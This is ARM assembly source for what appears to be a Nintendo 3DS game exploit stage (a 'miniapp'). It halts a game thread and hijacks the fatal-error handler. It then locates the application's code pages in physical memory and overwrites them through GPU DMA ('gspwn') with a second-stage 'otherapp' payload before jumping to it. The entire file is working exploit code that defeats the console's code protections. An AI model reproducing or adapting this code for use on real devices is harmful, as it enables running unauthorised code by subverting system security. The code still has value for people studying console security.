	#ifdef EUR_BUILD
	#include "parameters_eur.s"
	#include "addr_eur.s"
	#endif
	#ifdef USA_BUILD
	#include "parameters_usa.s"
	#include "addr_usa.s"
	#endif
	#ifdef JAP_BUILD
	#include "parameters_jap.s"
	#include "addr_jap.s"
	#endif
    .arm
	@ I'm about to commit sin with these branch abstractions
	#define HELPERAPP_TARGET_ADDR 0x100000
	#define TEXTABSTRACTPTR(x) (miniapp + ((x) - HELPERAPP_TARGET_ADDR))
	#define HELPERRELATIVEPTR(x) (HELPERAPP_TARGET_ADDR + ((x) - miniapp))
	#define OTHERAPP_BINLOAD_SIZE 0xC000
	#define MAKERESULT(level,summary,module,description) ((((level)&0x1F)<<27) | (((summary)&0x3F)<<21) | (((module)&0xFF)<<10) | ((description)&0x3FF))
	#define COLORFILL(r,g,b) ( 0x1000000 | (b << 16) | (g << 8) | r)
	@ some of the things here could be a lot cleaner
	@ but hey, what can one expect of hand writen assembly sometimes
_start:
miniapp:
	mov sp, r1
	mov r0, #1
	bl colordebug
    adr r6, .Lcourse_loader_stop_data @ Get to the course loader thread stop flag and set it
    ldm r6!, {r4, r5} @  After execute, r6 == addr .Lsrv_notif_handle
    ldr r4, [r4, #0x10]
    add r4, r4, #0x1E0
    ldr r4, [r4, #0x58]
    eor r4, r4, r5
    mov r5, #0
    ldr r4, [r4, #0x2A8]
    add r4, r4, #0x5800
    strb r5, [r4, #0xA5]
	ldm r6!, {r1-r4} @  After execute, r6 == addr .Lraise_thread_prio
	ldr r1, [r1] @ get srv notification handle
    str r4, [r3] @ change the fatal handler to svc 0x9 (exit thread)
    mov r0, #0
	svc 0x16 @ we release the srv semaphore get it out of waiting. It will panic due to the lack of a real srv notification
    ldm r6!, {r0, r1} @  After execute, r6 == addr .Lsleep_thread_param
    svc 0x0C
	ldm r6!, {r0, r1} @  After execute, r6 == addr .Ltarget_otherapp
    svc 0x0A
	mov r0, #2
	bl colordebug
    bl reconstruct_otherapp @ This function reconstructs the otherapp from all the copies in the recv buffer
	ldm r6!, {r4, r5} @ hop over .Lnullptr with r1. After execute, r6 == addr .Lotherapp_stackaddr
	sub sp, sp, r5, lsl #2
	mov r2, r5
	mov r1, r4
	mov r0, #3
	bl colordebug
	mov r0, sp
	bl find_vmem_pages
	mov r0, #4
	bl colordebug
	mov r0, sp
	mov r1, r5
	bl copy_otherapp_from_save_to_text
	add sp, sp, r5, lsl #2
	mov r0, #ROPKIT_BEFOREJUMP_CACHEBUFADDR
	mov r1, #ROPKIT_BEFOREJUMP_CACHEBUFSIZE
	bl TEXTABSTRACTPTR(GSPGPU_FlushDataCache)
	bl CmpThrow @ throw error if bad result
	ldm r6, {r5-r10} @ we've read .Lotherapp_stackaddr + .Lotherapp_data
	@ now we setup the paramblk for otherapp
	mov r0, r6
	mov r1, #0x1000
	bl TEXTABSTRACTPTR(MEMSET32_OTHER)
	str r7, [r6, #0x1C]
	str r8, [r6, #0x20]
	str r9, [r6, #0x48]
	str r10, [r6, #0x58]
	mov r0, #0
	bl colordebug
	mov r0, r6
	mov r1, r5
	bx r4
.Lcourse_loader_stop_data:
    .word GAME_SEQUENCE_BASE_PTR
    .word GAME_SEQUENCE_XOR_PAT
.Lsrv_notif_handle:
    .word SRV_NOTIFICATION_HANDLE
    .word 1
    .word FATAL_ERROR_HANDLER_ADDR
    .word HELPERRELATIVEPTR(fake_break_handler)
.Lraise_thread_prio:
	.word 0xFFFF8000 @ curr thread handle
	.word 0x18
.Lsleep_thread_param:
    .word 1000000000
    .word 0
.Ltarget_otherapp:
	.word MINIAPP_OTHERAPP_TEXT_ADDR
	.word (MINIAPP_MAXROPKIT_SIZE / 0x1000)
.Lotherapp_stackaddr:
	.word (0x10000000-4)
.Lotherapp_data:
	.word ROPKIT_LINEARMEM_BUF
	.word GXLOW_CMD4
	.word GSPGPU_FlushDataCache
	.word 0x8d @ Flags
	.word GSPGPU_SERVHANDLEADR

fake_break_handler:
	svc 0x09

CmpThrow:
	push {lr}
	movs r0, r0
	poppl {pc}
Throw:
	mov r0, #5
	bl colordebug
	pop {lr}
	svc 0x3C

@ search through paslr
@ r0/r7 - array of linear offsets (excepts accessable length to be 4*r2)
@ r1/r8 - text address target
@ r2/r9 - target text page count
@ returns nothing
@ throws error to err:f
find_vmem_pages:
	push {r0-r2, r4-r5, r7-r9, r10-r11, lr}
	mov r1, r2, lsl #2
	bl TEXTABSTRACTPTR(MEMSET32_OTHER)
	pop {r7-r9}
	adr r3, .Lappmemcheck
	ldm r3, {r3, r11}
	ldr r3, [r3] @ get APPMEMTYPE
	ldr r4, [r11, r3, lsl #2]
	mov r11, #ROPKIT_LINEARMEM_REGIONBASE
	add r4, r4, r11
	add r10, r11, #MINIAPP_WORKBUFFER_OFFSET
	mov r5, r9
	@ r10 - Work buffer
	@ r11 - Linear base
	@ r4 - next read address
	@ r5 - total of found pages, stops when r5 == arg3, throws error if r5 > arg3
	@ transfer size 0x100000
vmem_search_loop:
	sub r4, r4, #0x100000
	cmp r4, r11
	ldreq r0, .Lvmem_search_error_notfound
	bleq Throw
	cmp r4, r10
	beq vmem_search_loop @ skip, r4 == r10
	mov r0, r4
	mov r1, r10
	mov r2, #0x100000
	mov r3, r10
	bl flush_and_gspwn
	mov r0, r10
	mov r1, r8
	mov r2, r9
	mov r3, r7
	mov r12, r4
	bl search_linear_buffer
	subs r5, r5, r0
	popeq {r4-r5, r7-r9, r10-r11, pc} @ exit if all found
	bpl vmem_search_loop @ continue if there are any left to find
	ldr r0, .Lvmem_search_error_duplicatefinds @ if we hit this, we found multiple instances of the same page and over counted
	bl Throw
.Lappmemcheck:
	.word 0x1FF80030
	.word ropkit_appmemtype_appmemsize_table
.Lvmem_search_error_notfound:
	.word MAKERESULT(0x1F, 4, 254, 0x3EF) @ fatal, not found, application, no data
.Lvmem_search_error_duplicatefinds:
	.word MAKERESULT(0x1F, 5, 254, 0x3FC) @ fatal, invalid state, application, already exists

@ unconventional function arguments, but screw accessing stack arguments
@ r0/r5 - linear buffer to search
@ r1/r6 - text address target
@ r2/r7 - target text page count
@ r3/r8 - array of linear offsets (excepts accessable length to be 4*r2)
@ r12/r10 - currently searching linear offset (offset copied out with gspwn to buffer)
@ returns:
@ r0 - total pages found
search_linear_buffer:
	push {r0-r3, r4-r10, r11, lr}
	pop {r5-r8}
	mov r10, r12
	mov r11, #0
	@ we are going from end to start
	mov r4, #0x100
search_linear_buffer_loop:
	subs r4, r4, #1
	bmi search_linear_buffer_loop_end
	mov r9, r7
text_page_cmp_loop:
	subs r9, r9, #1
	bmi search_linear_buffer_loop
	add r0, r5, r4, lsl #12
	add r1, r6, r9, lsl #12
	mov r2, #0x1000
	bl memcmp32
	movs r0, r0
	bne text_page_cmp_loop
	add r0, r10, r4, lsl #12
	str r0, [r8, r9, lsl #2]
	add r11, r11, #1
	b text_page_cmp_loop
search_linear_buffer_loop_end:
	mov r0, r11
	pop {r4-r10, r11, pc}

@ r0 - linear .text vmem array
@ r1 - page count
copy_otherapp_from_save_to_text:
	push {r0-r1, r4-r5, r7, lr}
	pop {r4-r5}
	adr r7, .Lotherapp_spaces
	ldm r7, {r7}
otherapp_gspwn_loop:
	subs r5, r5, #1
	popmi {r4-r5, r7, pc}
	add r0, r7, r5, lsl #12
	ldr r1, [r4, r5, lsl #2]
	mov r2, #0x1000
	mov r3, r0
	bl flush_and_gspwn
	b otherapp_gspwn_loop
.Lotherapp_spaces:
	.word MINIAPP_ROPKIT_DEST_ADDR @ save source

@ except 32bit aligned and length all the way
memcmp32:
	push {lr}
	mov lr, r0
memcmp32_loop:
	subs r2, r2, #4
	movmi r0, #0
	popmi {pc}
	ldr r3, [lr], #4
	ldr r12, [r1], #4
	subs r0, r3, r12
	popne {pc}
	b memcmp32_loop

@ r0 - source
@ r1 - destination
@ r2 - size
call_gxlow_cmd4:
	push {lr}
	mov r12, #8
	mvn r3, #0
	push {r3, r12}
	mvn r12, #0
	push {r3, r12}
	@ return GXLOW_CMD4(source, destination, size, 0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff, 0x8)
	bl TEXTABSTRACTPTR(GXLOW_CMD4)
	pop {r1-r3, r12, pc} @ pop to 4 scratch registers to do same as add sp, sp, #16

@ r0 - source
@ r1 - destination
@ r2 - size
@ r3 - flush address
flush_and_gspwn:
	push {r0-r2, lr}
	mov r0, r3
	mov r1, r2
	bl TEXTABSTRACTPTR(GSPGPU_FlushDataCache)
	bl CmpThrow
	pop {r0-r2}
	bl call_gxlow_cmd4
	bl CmpThrow
	ldr r0, .Lsleep_transfer_half
	mov r1, #0
	svc 0x0A
	pop {pc}
.Lsleep_transfer_half:
	.word 150000000
    
ropkit_appmemtype_appmemsize_table: @ This is a table for the actual APPLICATION mem-region size, for each APPMEMTYPE.
    .word 0x04000000 @ type0
    .word 0x04000000 @ type1
    .word 0x06000000 @ type2
    .word 0x05000000 @ type3
    .word 0x04800000 @ type4
    .word 0x02000000 @ type5
    .word 0x07C00000 @ type6
    .word 0x0B200000 @ type7

@r0 = dstptr
@r1 = currptr
@r2 = size
@r3 = repeattimes
@r12 = chunksize
reconstruct_findblock:
    push {r1-r12, lr}
    mov r10, #0
    findblockloop:
        ldr r4, [r1]
        cmp r4, #0
        bne findblockexitloop
        add r1, r1, r2
        add r10, r10, #1
        cmp r10, r3
        bne findblockloop
        mov r0, #0xFFFFFFFF
        pop  {r1-r12, pc}
    findblockexitloop:
        cmp r4, #0x05500000
        moveq r4, #0
        streq r4, [r1]
        mov r2, r12
        bl TEXTABSTRACTPTR(MEMCPY)
        mov r0, #0
        pop  {r1-r12, pc}

reconstruct_otherapp:
    push {r0-r12, lr}
    adr r6, .Lreconstruct_data
    ldm r6, {r8, r9, r10, r11, r12}
    ldr r9, [r9]
    ldr r10, [r10]
    add r6, r8, r9 @ r6 = endptr
    mov r5, r8 @ r5 = currptr
    reconstructloop:
        mov r0, r11
        mov r1, r5
        mov r2, r9
        mov r3, r10
        bl reconstruct_findblock
        bl CmpThrow
        add r11, r11, r12
        add r5, r5, r12
        cmp r5, r6
        bne reconstructloop
    pop  {r0-r12, pc}

.Lreconstruct_data:
    .word MINIAPP_ROPKIT_LOADADDR @ r8
    .word MINIAPP_ROPKIT_SIZE_PTR @ r9
    .word MINIAPP_ROPKIT_REPEATTIMES_PTR @ r10
    .word MINIAPP_ROPKIT_DEST_ADDR @ r11
    .word 0x37C @ r12

@ R0 = color
colordebug:
	push {r0-r12, lr}
	mov  r7, r0
	adr  r6, .Lcolor_debug_data
	ldm  r6!, {r0, r1, r3}
	add  r2, r6, r7, LSL#2
	bl	 TEXTABSTRACTPTR(GSP_WRITEHWREGS)
	pop  {r0-r12, pc}
.Lcolor_debug_data:
	.word GSPGPU_SERVHANDLEADR
	.word (0x10202A04 - 0x10000000)
	.word 4
	.word 0
	.word COLORFILL(64, 64, 64)
	.word COLORFILL(0, 255, 0)
	.word COLORFILL(0, 0, 255)
	.word COLORFILL(0, 255, 255)
	.word COLORFILL(255, 0, 0)
miniappend:
